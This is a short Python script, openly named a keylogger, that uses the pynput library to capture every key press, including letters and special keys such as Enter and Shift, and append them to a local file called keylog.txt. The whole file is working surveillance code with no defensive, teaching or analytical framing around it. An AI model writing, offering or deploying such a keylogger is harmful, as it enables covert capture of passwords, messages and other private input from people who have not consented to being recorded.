from pynput import keyboard

LOG_FILE = "keylog.txt"

def keyPressed(key, file_path=LOG_FILE):
    """Logs key presses to a file."""
    try:
        with open(file_path, 'a') as log:
            if isinstance(key, keyboard.KeyCode):  
                log.write(key.char)  # ✅ Normal letters (no brackets)
            else:
                log.write(f" [{key.name.capitalize()}] ")  # ✅ Special keys like Enter, Shift
    except Exception as e:
        print(f"Error logging key: {e}")

def start_keylogger():
    """Start the keylogger."""
    with keyboard.Listener(on_press=keyPressed) as listener:
        listener.join()

if __name__ == "__main__":
    start_keylogger()
